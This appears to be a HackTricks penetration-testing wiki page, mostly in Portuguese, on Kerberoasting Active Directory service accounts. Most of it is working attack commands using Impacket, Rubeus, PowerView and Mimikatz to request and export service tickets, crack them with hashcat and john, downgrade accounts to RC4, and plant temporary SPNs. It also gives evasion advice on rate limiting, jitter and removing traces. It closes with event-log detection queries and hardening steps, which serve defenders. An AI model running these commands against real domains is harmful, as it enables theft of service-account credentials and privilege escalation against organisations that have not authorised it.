# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting focuses on the acquisition of TGS tickets, specifically those related to services operating under user accounts in Active Directory (AD), excluding computer accounts. The encryption of these tickets utilizes keys that originate from user passwords, allowing for offline credential cracking. The use of a user account as a service is indicated by a non-empty ServicePrincipalName (SPN) property.

Any authenticated domain user can request TGS tickets, so no special privileges are needed.

### Pontos-chave

- Aplica-se a tickets TGS de serviços que rodam sob contas de usuário (ou seja, contas com SPN definido; não contas de computador).
- Os tickets são criptografados com uma chave derivada da senha da conta de serviço e podem ser quebrados offline.
- Não são necessários privilégios elevados; qualquer conta autenticada pode solicitar tickets TGS.

> [!WARNING]
> A maioria das ferramentas públicas prefere solicitar tickets de serviço RC4-HMAC (etype 23) porque são mais rápidos de quebrar que AES. Hashes TGS RC4 começam com `$krb5tgs$23$*`, AES128 com `$krb5tgs$17$*`, e AES256 com `$krb5tgs$18$*`. No entanto, muitos ambientes estão migrando para apenas AES. Não presuma que apenas RC4 é relevante.
> Além disso, evite o kerberoast “spray-and-pray”. O kerberoast padrão do Rubeus pode consultar e solicitar tickets para todos os SPNs e é ruidoso. Enumere e mire em principals interessantes primeiro.

### Segredos de contas de serviço & custo criptográfico do Kerberos

Muitos serviços ainda executam sob contas de usuário com senhas gerenciadas manualmente. O KDC criptografa tickets de serviço com chaves derivadas dessas senhas e fornece o texto cifrado a qualquer principal autenticado, então o kerberoasting oferece tentativas offline ilimitadas sem bloqueios ou telemetria do DC. O modo de criptografia determina o orçamento de quebra:

| Modo | Derivação da chave | Tipo de criptografia | Aproximada taxa no RTX 5090* | Observações |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 com 4.096 iterações e um salt por principal gerado a partir do domínio + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 milhões de tentativas/s | O salt bloqueia rainbow tables mas ainda permite quebra rápida de senhas curtas. |
| RC4 + NT hash | MD4 única da senha (hash NT sem salt); o Kerberos apenas mistura um confounder de 8 bytes por ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **bilhões** de tentativas/s | ~1000× mais rápido que AES; atacantes forçam RC4 sempre que `msDS-SupportedEncryptionTypes` permitir. |

*Benchmarks de Chick3nman como d em [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

O confounder do RC4 apenas aleatoriza o fluxo de chave; não adiciona trabalho por tentativa. A menos que as contas de serviço dependam de segredos aleatórios (gMSA/dMSA, contas de máquina ou strings gerenciadas por vault), a velocidade de comprometimento é puramente função do orçamento de GPU. Exigir etypes apenas-AES elimina a redução que resulta em bilhões de tentativas por segundo, mas senhas humanas fracas ainda sucumbem ao PBKDF2.

### Ataque

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Ferramentas multifuncionais incluindo verificações de kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerar usuários kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Técnica 1: Solicitar TGS e dump da memória
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Técnica 2: Ferramentas automáticas
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Uma solicitação TGS gera o Windows Security Event 4769 (Um ticket de serviço Kerberos foi solicitado).

### OPSEC e ambientes somente AES

- Solicitar RC4 intencionalmente para contas sem AES:
- Rubeus: `/rc4opsec` usa tgtdeleg para enumerar contas sem AES e solicita tickets de serviço RC4.
- Rubeus: `/tgtdeleg` com kerberoast também dispara solicitações RC4 quando possível.
- Roast contas somente com AES em vez de falhar silenciosamente:
- Rubeus: `/aes` enumera contas com AES habilitado e solicita tickets de serviço AES (etype 17/18).
- Se você já possui um TGT (PTT ou de um .kirbi), pode usar `/ticket:<blob|path>` com `/spn:<SPN>` ou `/spns:<file>` e omitir o LDAP.
- Direcionamento, limitação de taxa e menos ruído:
- Use `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtre por senhas provavelmente fracas usando `/pwdsetbefore:<MM-dd-yyyy>` (senhas mais antigas) ou direcione OUs privilegiadas com `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistência / Abuso

Se você controla ou pode modificar uma conta, você pode torná-la kerberoastable adicionando um SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Rebaixar uma conta para habilitar RC4 para facilitar o cracking (requer privilégios de gravação no objeto de destino):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll over a user (temporary SPN)

Quando o BloodHound mostra que você tem controle sobre um objeto de usuário (por exemplo, GenericWrite/GenericAll), você pode realizar um “targeted-roast” de forma confiável desse usuário específico mesmo se ele não tiver atualmente nenhum SPN:

- Adicione um SPN temporário ao usuário controlado para torná-lo roastable.
- Solicite um TGS-REP criptografado com RC4 (etype 23) para esse SPN para favorecer o cracking.
- Quebre o hash `$krb5tgs$23$...` com hashcat.
- Remova o SPN para reduzir vestígios.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Comando de uma linha Linux (targetedKerberoast.py automatiza: adicionar SPN -> solicitar TGS (etype 23) -> remover SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Quebre a saída com hashcat autodetect (modo 13100 para `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adicionar/remover SPNs gera alterações no diretório (Event ID 5136/4738 no usuário alvo) e a requisição de TGS gera o Event ID 4769. Considere limitar a taxa e realizar limpeza imediata.

Você pode encontrar ferramentas úteis para ataques kerberoast aqui: https://github.com/nidem/kerberoast

Se você encontrar este erro no Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` é devido ao desalinhamento de horário local. Sincronize com o DC:

- `ntpdate <DC_IP>` (descontinuado em algumas distribuições)
- `rdate -n <DC_IP>`

### Kerberoast sem uma conta de domínio (AS-requested STs)

Em setembro de 2022, Charlie Clark mostrou que, se um principal não exigir pré-autenticação, é possível obter um service ticket via um KRB_AS_REQ forjado alterando o sname no corpo da requisição, obtendo efetivamente um service ticket em vez de um TGT. Isso espelha o AS-REP roasting e não requer credenciais válidas do domínio.

Veja detalhes: relatório da Semperis “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Você deve fornecer uma lista de usuários porque, sem credenciais válidas, você não pode consultar o LDAP com esta técnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Relacionado

Se você estiver visando usuários AS-REP roastable, veja também:

{{#ref}}
asreproast.md
{{#endref}}

### Detecção

Kerberoasting pode ser furtivo. Procure pelo Event ID 4769 nos DCs e aplique filtros para reduzir ruído:

- Exclua o nome de serviço `krbtgt` e nomes de serviço que terminam com `$` (contas de computador).
- Exclua requisições de contas de máquina (`*$$@*`).
- Somente requisições bem-sucedidas (Código de Falha `0x0`).
- Monitore os tipos de criptografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Não alerte apenas em `0x17`.

Exemplo de triagem PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ideias adicionais:

- Estabeleça uma linha de base do uso normal de SPN por host/usuário; gere alertas para grandes rajadas de solicitações de SPN distintas de um único principal.
- Sinalize uso incomum de RC4 em domínios reforçados com AES.

### Mitigation / Hardening

- Use gMSA/dMSA ou contas de máquina para serviços. Contas gerenciadas têm senhas aleatórias com 120+ caracteres e rotacionam automaticamente, tornando o cracking offline impraticável.
- Imponha AES em contas de serviço definindo `msDS-SupportedEncryptionTypes` para apenas AES (decimal 24 / hex 0x18) e então rotacione a senha para que as chaves AES sejam derivadas.
- Quando possível, desative RC4 no seu ambiente e monitore tentativas de uso de RC4. Nos DCs você pode usar o valor de registro `DefaultDomainSupportedEncTypes` para direcionar os padrões para contas sem `msDS-SupportedEncryptionTypes` definido. Teste exaustivamente.
- Remova SPNs desnecessários de contas de usuário.
- Use senhas longas e aleatórias para contas de serviço (25+ caracteres) se contas gerenciadas não forem viáveis; bloqueie senhas comuns e audite regularmente.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
